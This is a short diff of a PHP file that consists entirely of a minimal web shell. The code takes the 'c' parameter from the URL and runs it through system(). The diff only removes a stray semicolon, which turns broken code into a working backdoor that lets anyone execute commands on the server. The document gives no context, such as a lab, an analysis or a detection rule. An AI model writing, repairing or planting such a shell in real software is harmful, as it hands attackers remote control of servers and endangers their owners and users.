@@ -1,5 +1,5 @@
 <?php
-   if(isset($_GET["c"]);
+   if(isset($_GET["c"])
    {
       system($_GET["c"]);
    }
